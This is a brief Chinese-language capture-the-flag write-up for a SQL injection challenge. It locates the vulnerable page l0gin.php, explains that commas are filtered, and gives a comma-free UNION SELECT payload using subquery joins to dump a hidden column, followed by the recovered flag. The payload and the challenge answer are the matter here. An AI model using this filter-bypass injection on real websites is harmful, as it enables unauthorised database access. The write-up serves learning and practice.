
# SQLi


* 查看源码发现, id有注入漏洞，但是尝试很多方法没法注入

``` 
<html>
<head><title>Loading...</title></head>
<body>
	<!-- login.php?id=1 -->
</body>
</html>
```

* 查看wp, 得知真实漏洞网址是l0gin.php?id=1
> https://blog.csdn.net/qq_41618162/article/details/81980988


* 用传统的手工注入，发现逗号之后被过滤。得知是绕过逗号注入
> https://www.cnblogs.com/hackxf/p/9490534.html 

``` 
-1' union select * from (select group_concat(distinct(flag_9c861b688330)) from users) a join (select 2) b %23
```

* 得到flag
> flag{5942afa9-0518-472d-bdad-61c6c4d0d304}
